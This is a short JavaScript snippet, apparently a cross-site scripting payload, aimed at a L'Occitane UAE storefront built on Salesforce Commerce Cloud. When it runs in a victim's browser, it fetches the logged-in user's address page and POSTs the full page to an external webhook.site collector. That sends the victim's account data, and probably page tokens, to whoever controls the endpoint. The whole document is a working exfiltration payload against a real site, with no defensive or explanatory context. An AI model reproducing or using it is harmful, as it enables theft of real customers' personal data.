async function ambil(){
    const a = await fetch('/on/demandware.store/Sites-Loccitane_AE-Site/en_AE/Address-AddAddress');
    const b = await a.text();
    const kirim = await fetch('https://webhook.site/734833a0-09c5-4698-a0dc-39ed5cef40e9',{
        method:'POST',
        headers:{
            'Content-Type':'text/plain;charset=utf-8'
        },
        body: b
    });

}
ambil()